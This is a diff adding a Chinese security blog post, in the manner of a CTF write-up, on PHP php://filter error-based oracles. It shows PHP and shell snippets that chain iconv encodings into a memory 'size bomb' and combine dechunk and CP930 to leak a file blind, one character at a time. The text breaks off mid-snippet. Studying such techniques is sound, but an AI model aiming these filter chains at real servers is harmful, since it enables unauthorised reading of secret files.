@@ -1,0 +1,717 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title>filter中发生的leak - Delete&#39;s blog</title><meta name="Description" content=""><meta property="og:title" content="filter中发生的leak" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://ML-hacker.github.io/posts/filterleak/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-07-25T21:25:26+08:00" />
+<meta property="article:modified_time" content="2024-07-25T21:25:26+08:00" />
+
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="filter中发生的leak"/>
+<meta name="twitter:description" content=""/>
+<meta name="application-name" content="Delete&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="Delete&#39;s blog">
+
+<meta name="theme-color" content="#f8f8f8"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="canonical" href="http://ML-hacker.github.io/posts/filterleak/" /><link rel="prev" href="http://ML-hacker.github.io/posts/hitcon2024/" />
+<link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "filter中发生的leak",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http://ML-hacker.github.io/posts/filterleak/"
+        },"genre": "posts","wordcount":  689 ,
+        "url": "http://ML-hacker.github.io/posts/filterleak/","datePublished": "2024-07-25T21:25:26+08:00","dateModified": "2024-07-25T21:25:26+08:00","publisher": {
+            "@type": "Organization",
+            "name": "Delete"},"author": {
+                "@type": "Person",
+                "name": "Delete"
+            },"description": ""
+    }
+    </script></head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme;   window.isDark = window.theme !== 'light' }
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('' === 'light' || '' === 'dark' || '' === 'black') setTheme(''), saveTheme(''); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+        window.switchThemeEventSet = new Set()
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Delete&#39;s blog"><span id="desktop-header-typeit" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about"> About </a><a class="menu-item" href="/friend"> Friend </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                    <select class="color-theme-select" id="theme-select-desktop" title="Switch Theme">
+                        <option value="light">Light</option>
+                        <option value="dark">Dark</option>
+                        <option value="black">Black</option>
+                        <option value="auto">Auto</option>
+                    </select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Delete&#39;s blog"><span id="mobile-header-typeit" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about" title="">About</a><a class="menu-item" href="/friend" title="">Friend</a><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+                <select class="color-theme-select" id="theme-select-mobile" title="Switch Theme">
+                    <option value="light">Light</option>
+                    <option value="dark">Dark</option>
+                    <option value="black">Black</option>
+                    <option value="auto">Auto</option>
+                </select>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><article class="page single"><h1 class="single-title animate__animated animate__flipInX">filter中发生的leak</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="https://github.com/ML-hacker" title="Author" target="_blank" rel="noopener noreferrer author" class="author">Delete</a>
+                </span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2024-07-25">2024-07-25</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2024-07-25">2024-07-25</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;689 words&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;4 minutes&nbsp;</div>
+        </div><div class="content" id="content"><h1 id="前言" class="headerLink">
+    <a href="#%e5%89%8d%e8%a8%80" class="header-mark"></a>前言</h1><p>师傅们在群里讨论出题的时候，发了一段没有返回的file_get_content出来，结果Goku师傅说可以利用侧信道来打，我寻思着咋打呢，于是去求学了，结果我倒是觉得不叫侧信道吧，我觉得只是通过filter的各种parsel来把flag或者信息leak出来。</p>
+<h1 id="demo1" class="headerLink">
+    <a href="#demo1" class="header-mark"></a>demo1</h1><p>这里是说在DownUnder2022中有这样的一道题</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="nx">file</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>他没有吧读取到的内容print出来，所以这个题似乎是0解。
+具体怎么解的请听下面的讲解</p>
+<h1 id="file-read-with-error-based-oracle" class="headerLink">
+    <a href="#file-read-with-error-based-oracle" class="header-mark"></a>File read with error-based oracle</h1><p>这里基于的原理就是说在filter中走过滤器的话会有最大的size限制，所以就可以利用这个报错作为标志来把数据爆破出来
+然后简要概括就是三个步骤：</p>
+<ul>
+<li>用iconv来不断encoding来增加长度从而触发memory error</li>
+<li>用dechunk来确定第一个字符。</li>
+<li>再利用iconv去不断爆破剩下的字符。
+其实就是不断循环的过程，这个知识点其实很多都是和我前面写的filterchain有关系的。</li>
+</ul>
+<h2 id="overflowing-the-maximum-file-size" class="headerLink">
+    <a href="#overflowing-the-maximum-file-size" class="header-mark"></a>OVERFLOWING THE MAXIMUM FILE SIZE</h2><p>在利用php://filter的时候我们可以给他加入过滤器来获取编码后的内容等等操作,这里是利用一些filter的效果</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ php -r <span class="s1">&#39;$string = &#34;START&#34;; echo strlen($string).&#34;\n&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="s1">5 
+</span></span></span><span class="line"><span class="cl"><span class="s1">$ php -r &#39;</span><span class="nv">$string</span> <span class="o">=</span> <span class="s2">&#34;START&#34;</span><span class="p">;</span> <span class="nb">echo</span> strlen<span class="o">(</span>iconv<span class="o">(</span><span class="s2">&#34;UTF8&#34;</span>, <span class="s2">&#34;UNICODE&#34;</span>, <span class="nv">$string</span><span class="o">))</span>.<span class="s2">&#34;\n&#34;</span><span class="p">;</span><span class="s1">&#39; 
+</span></span></span><span class="line"><span class="cl"><span class="s1">12 
+</span></span></span><span class="line"><span class="cl"><span class="s1">$ php -r &#39;</span><span class="nv">$string</span> <span class="o">=</span> <span class="s2">&#34;START&#34;</span><span class="p">;</span> <span class="nb">echo</span> strlen<span class="o">(</span>iconv<span class="o">(</span><span class="s2">&#34;UTF8&#34;</span>, <span class="s2">&#34;UCS-4&#34;</span>, <span class="nv">$string</span><span class="o">))</span>.<span class="s2">&#34;\n&#34;</span><span class="p">;</span><span class="err">&#39;</span> 
+</span></span><span class="line"><span class="cl"><span class="m">20</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里我们主要看一下USC-4这个，可以看到他把5个字节的内容给他转换成了20个长度的字节。并且还有一个USC-4LE的过滤器，他实现的效果是这样的。
+<figure><img
+        
+        loading="lazy"
+        src="/img/filterleak/1.png"
+        srcset="/img/filterleak/1.png, /img/filterleak/1.png 1.5x, /img/filterleak/1.png 2x"
+        alt="/img/filterleak/1.png"
+        title="/img/filterleak/1.png" ></figure>
+可以看到我们执行了两次iconv后所有的字符都被提到最前面了当做单独的一行。
+所以我们可以不断的利用USC-4LE来扩大容量来使得其溢出</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$string</span> <span class="o">=</span> <span class="s2">&#34;delete&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="mi">20</span> <span class="p">;</span><span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$string</span> <span class="o">=</span> <span class="nx">iconv</span><span class="p">(</span><span class="s2">&#34;UTF8&#34;</span><span class="p">,</span><span class="s2">&#34;UCS-4LE&#34;</span><span class="p">,</span><span class="nv">$string</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><img
+        
+        loading="lazy"
+        src="/img/filterleak/2.png"
+        srcset="/img/filterleak/2.png, /img/filterleak/2.png 1.5x, /img/filterleak/2.png 2x"
+        alt="/img/filterleak/2.png"
+        title="/img/filterleak/2.png" ></figure>
+可以看到zsh自动把这个进程删掉了。（这里其实就是溢出了他自动把进程kill了）
+报错也可以是这样的</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">Fatal error: Allowed memory size of 134217728 bytes exhausted (tried to allocate 83886144 bytes) in /tmp/iconv.php on line 6
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这就满足了第一个条件了，就是我们要造成一次溢出（其实我认为就是作为一个回显来判断是否第一个字符满足某个过滤器，这样子就能一个个确定字符然后把内容leak出来）</p>
+<h2 id="leaking-the-first-character-of-the-file" class="headerLink">
+    <a href="#leaking-the-first-character-of-the-file" class="header-mark"></a>LEAKING THE FIRST CHARACTER OF THE FILE</h2><p>学会这个之后我们就可以来开始利用dechunk来确定字符等等事情了。</p>
+<p>关于dechunk的用法。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">5\r\n (chunk length) 
+</span></span><span class="line"><span class="cl">Chunk\r\n (chunk data) 
+</span></span><span class="line"><span class="cl">f\r\n (chunk length) 
+</span></span><span class="line"><span class="cl">PHPfiltersrock!\r\n (chunk data)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后我们来看一个例子</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s2">&#34;START&#34;</span> &gt; /tmp/test 
+</span></span><span class="line"><span class="cl">$ php -r <span class="s1">&#39;echo file_get_contents(&#34;php://filter/dechunk/resource=/tmp/test&#34;);&#39;</span> 
+</span></span><span class="line"><span class="cl">START 
+</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s2">&#34;0TART&#34;</span> &gt; /tmp/test 
+</span></span><span class="line"><span class="cl">$ php -r <span class="s1">&#39;echo file_get_contents(&#34;php://filter/dechunk/resource=/tmp/test&#34;);&#39;</span> 
+</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s2">&#34;ATART&#34;</span> &gt; /tmp/test 
+</span></span><span class="line"><span class="cl">$ php -r <span class="s1">&#39;echo file_get_contents(&#34;php://filter/dechunk/resource=/tmp/test&#34;);&#39;</span> 
+</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s2">&#34;aTART&#34;</span> &gt; /tmp/test 
+</span></span><span class="line"><span class="cl">$ php -r <span class="s1">&#39;echo file_get_contents(&#34;php://filter/dechunk/resource=/tmp/test&#34;);&#39;</span> 
+</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s2">&#34;GTART&#34;</span> &gt; /tmp/test 
+</span></span><span class="line"><span class="cl">$ php -r <span class="s1">&#39;echo file_get_contents(&#34;php://filter/dechunk/resource=/tmp/test&#34;);&#39;</span> 
+</span></span><span class="line"><span class="cl">GTART
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以看到这里只要是<code>hexadecimal value</code>：[0-9]、[a-f]、[A-F]开头的都被dechunk drop掉了，所以我们就可以利用这个来确定开头的是否是16进制字符。
+也就是搭配上面的overflow，我们就可以确定是否是16进制开头的string了。但是要找到具体字符还要继续往下看‘</p>
+<h2 id="retrieving-the-leading-character-value" class="headerLink">
+    <a href="#retrieving-the-leading-character-value" class="header-mark"></a>Retrieving the leading character value</h2><h3 id="retrieving--a-e-characters" class="headerLink">
+    <a href="#retrieving--a-e-characters" class="header-mark"></a>Retrieving  [a-e] characters</h3><p>首先我们就要来确定a-e字符的情况。
+这里我们先来了解一下CP930或者叫X-IBM930
+ASCII code：</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>x0</th>
+<th>x1</th>
+<th>x2</th>
+<th>x3</th>
+<th>x4</th>
+<th>x5</th>
+<th>x6</th>
+<th>[&hellip;]</th>
+<th>xf</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>[&hellip;.]</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>6x</td>
+<td>`</td>
+<td>a</td>
+<td>b</td>
+<td>c</td>
+<td>d</td>
+<td>e</td>
+<td>f</td>
+<td>[&hellip;]</td>
+<td>o</td>
+</tr>
+<tr>
+<td>[&hellip;.]</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p>CP930、X-IBM930</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>x0</th>
+<th>x1</th>
+<th>x2</th>
+<th>x3</th>
+<th>x4</th>
+<th>x5</th>
+<th>x6</th>
+<th>[&hellip;]</th>
+<th>xf</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>[&hellip;]</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>6x</td>
+<td>-</td>
+<td>/</td>
+<td>a</td>
+<td>b</td>
+<td>c</td>
+<td>d</td>
+<td>e</td>
+<td>[&hellip;]</td>
+<td>?</td>
+</tr>
+<tr>
+<td>[&hellip;]</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>cx</td>
+<td>{</td>
+<td>A</td>
+<td>B</td>
+<td>C</td>
+<td>D</td>
+<td>E</td>
+<td>F</td>
+<td>[&hellip;]</td>
+<td></td>
+</tr>
+<tr>
+<td>[&hellip;]</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>fx</td>
+<td>0</td>
+<td>1</td>
+<td>2</td>
+<td>3</td>
+<td>4</td>
+<td>5</td>
+<td>6</td>
+<td>[&hellip;]</td>
+<td>Ÿ</td>
+</tr>
+</tbody>
+</table>
+<p>我们可以看到在X-IBM930中小写字母，大写字母和数字都是在不同索引上的，所以base64-encode就不会弄混。
+来看个例子</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$guess_char</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;=</span> <span class="mi">7</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$remove_junk_chars</span> <span class="o">=</span> <span class="s2">&#34;convert.quoted-printable-encode|convert.iconv.UTF8.UTF7|convert.base64-decode|convert.base64-encode|&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$guess_char</span> <span class="o">.=</span> <span class="s2">&#34;convert.iconv.UTF8.UNICODE|convert.iconv.UNICODE.CP930|</span><span class="si">$remove_junk_chars</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$filter</span> <span class="o">=</span> <span class="s2">&#34;php://filter/</span><span class="si">$guess_char</span><span class="s2">/resource=/tmp/test&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;IBM-930 conversions : &#34;</span><span class="o">.</span><span class="nv">$i</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;, First char value : &#34;</span><span class="o">.</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$filter</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>执行</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s1">&#39;aSTART&#39;</span> &gt; /tmp/test
+</span></span><span class="line"><span class="cl">$ php oracle.php 
+</span></span><span class="line"><span class="cl">IBM-930 conversions : 1, First char value : b
+</span></span><span class="line"><span class="cl">IBM-930 conversions : 2, First char value : c
+</span></span><span class="line"><span class="cl">IBM-930 conversions : 3, First char value : d
+</span></span><span class="line"><span class="cl">IBM-930 conversions : 4, First char value : e
+</span></span><span class="line"><span class="cl">IBM-930 conversions : 5, First char value : f
+</span></span><span class="line"><span class="cl">IBM-930 conversions : 6, First char value : g
+</span></span><span class="line"><span class="cl">IBM-930 conversions : 7, First char value : h
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>其中<code>$remove_junk_chars</code>是用于从链中删除不可打印的字符，$guess_char 用于应用 X-IBM-930 编解码器。最后，每次循环都会打印转换后的文件内容的第一个字符。</p>
+<p>然后我们来试试和前面构造error一样</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$size_bomb</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;=</span> <span class="mi">13</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$size_bomb</span> <span class="o">.=</span> <span class="s2">&#34;convert.iconv.UTF8.UCS-4|&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$guess_char</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$index</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;=</span> <span class="mi">6</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$remove_junk_chars</span> <span class="o">=</span> <span class="s2">&#34;convert.quoted-printable-encode|convert.iconv.UTF8.UTF7|convert.base64-decode|convert.base64-encode|&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$guess_char</span> <span class="o">.=</span> <span class="s2">&#34;convert.iconv.UTF8.UNICODE|convert.iconv.UNICODE.CP930|</span><span class="si">$remove_junk_chars</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$filter</span> <span class="o">=</span> <span class="s2">&#34;php://filter/</span><span class="si">$guess_char</span><span class="s2">|dechunk|</span><span class="si">$size_bomb</span><span class="s2">/resource=/tmp/test&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$filter</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;IBM-930 conversions : &#34;</span><span class="o">.</span><span class="nv">$i</span><span class="o">.</span><span class="s2">&#34;, the first character is &#34;</span><span class="o">.</span><span class="s2">&#34;edcba&#34;</span><span class="p">[</span><span class="nv">$i</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>读者可以自行去运行。
+通过这个得出结论是我们可以通过这一段来确定开头字母是<code>a</code>、<code>b</code>、<code>c</code>、<code>d</code>、<code>e</code>这几个字母（他会在这些字母之后报error）</p>
+<p>同样的我们用rot13可以判断<code>n</code>、<code>o</code>、<code>p</code>、<code>q</code>、<code>r</code>，</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$string</span> <span class="o">=</span> <span class="s2">&#34;START&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$size_bomb</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
